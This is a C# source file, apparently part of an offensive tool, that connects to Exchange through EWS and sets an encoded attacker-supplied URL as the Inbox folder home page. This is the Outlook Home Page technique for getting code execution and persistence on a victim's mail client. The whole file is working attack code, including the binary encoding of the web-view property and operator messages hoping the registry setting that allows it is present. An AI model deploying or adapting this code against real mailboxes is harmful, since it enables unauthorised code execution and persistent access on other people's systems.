using System;
using System.Globalization;
using System.IO;
using System.Linq;
using Microsoft.Exchange.WebServices.Data;

namespace EWS
{
    public class HomeFolder
    {
        public static void AddHomeFolderURL(ExchangeService service, string url)
        {
            Console.WriteLine(" [>] Using {0}", url);

            ExtendedPropertyDefinition folderWebviewinfoProperty = new ExtendedPropertyDefinition(14047, MapiPropertyType.Binary);
            Folder inbox = Folder.Bind(service, WellKnownFolderName.Inbox);

            inbox.SetExtendedProperty(folderWebviewinfoProperty, EncodeUrl(url));
            inbox.Update();

            Console.WriteLine(" [>] Done. Let's hope EnableRoamingFolderHomepages is there...");

        }

        private static byte[] EncodeUrl(string url)
        {
            var writer = new StringWriter();
            var dataSize = ((ConvertToHex(url).Length / 2) + 2).ToString("X2");

            writer.Write("02"); // Version
            writer.Write("00000001"); // Type
            writer.Write("00000001"); // Flags
            writer.Write("00000000000000000000000000000000000000000000000000000000"); // unused
            writer.Write("000000");
            writer.Write(dataSize);
            writer.Write("000000");
            writer.Write(ConvertToHex(url));
            writer.Write("0000");

            var buffer = HexStringToByteArray(writer.ToString());
            return buffer;
        }

        private static string ConvertToHex(string input)
        {
            return string.Join(string.Empty, input.Select(c => ((int)c).ToString("x2") + "00").ToArray());
        }

        private static byte[] HexStringToByteArray(string input)
        {
            return Enumerable
                .Range(0, input.Length / 2)
                .Select(index => byte.Parse(input.Substring(index * 2, 2), NumberStyles.AllowHexSpecifier)).ToArray();
        }
    }
}
